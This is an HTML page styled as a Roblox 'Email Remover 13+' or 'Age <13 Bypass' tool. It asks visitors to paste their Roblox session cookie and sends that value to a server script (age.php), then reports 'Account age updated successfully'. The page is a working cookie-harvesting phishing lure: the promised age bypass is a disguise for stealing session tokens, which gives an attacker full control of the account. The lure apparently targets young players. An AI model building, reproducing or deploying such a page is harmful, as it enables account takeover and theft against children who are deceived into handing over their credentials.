<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Dua Age <13 Bypass</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      background: linear-gradient(to right, #000000, #1a1a1a);
      color: #ff0000;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      overflow: hidden;
    }

    .container {
      background: rgba(20, 20, 20, 0.9);
      padding: 3rem;
      border-radius: 20px;
      box-shadow: 0 10px 30px rgba(255, 0, 0, 0.5);
      text-align: center;
      max-width: 400px;
    }

    h1 {
      font-size: 2rem;
      margin-bottom: 1.5rem;
      color: #ff0000;
    }

    label {
      font-size: 1rem;
    }

    input[type="text"] {
      width: 100%;
      padding: 10px;
      margin: 1rem 0;
      border: none;
      border-radius: 10px;
      outline: none;
      font-size: 1rem;
      background: #1a1a1a;
      color: #ff0000;
    }

    .btn {
      background: #800000;
      color: white;
      padding: 10px 20px;
      font-size: 1rem;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      transition: background 0.3s;
    }

    .btn:hover {
      background: #ff0000;
    }

    .message {
      margin-top: 1rem;
      font-size: 1rem;
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>Email Remover 13+</h1>

    <form id="roblox-form">
      <label for="roblox-cookie">Enter your Roblox cookie:</label><br>
      <input type="text" id="roblox-cookie" name="roblox-cookie" placeholder="_|WARNING:-..." required><br>
      <button type="submit" class="btn">Submit</button>
    </form>

    <div id="message" class="message"></div>
  </div>

  <script>
    const form = document.getElementById('roblox-form');
    const message = document.getElementById('message');

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      const cookie = document.getElementById('roblox-cookie').value;

      message.textContent = 'Processing...';

      try {
        const response = await fetch('age.php', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ cookie })
        });

        const data = await response.json();

        if (data.success) {
          message.textContent = '✅ Account age updated successfully!';
          message.style.color = 'lime';
        } else {
          message.textContent = `❌ Error: ${data.message}`;
          message.style.color = 'red';
        }
      } catch (error) {
        message.textContent = '❌ An unexpected error occurred.';
        message.style.color = 'red';
        console.error('Error:', error);
      }
    });
  </script>

</body>
</html>
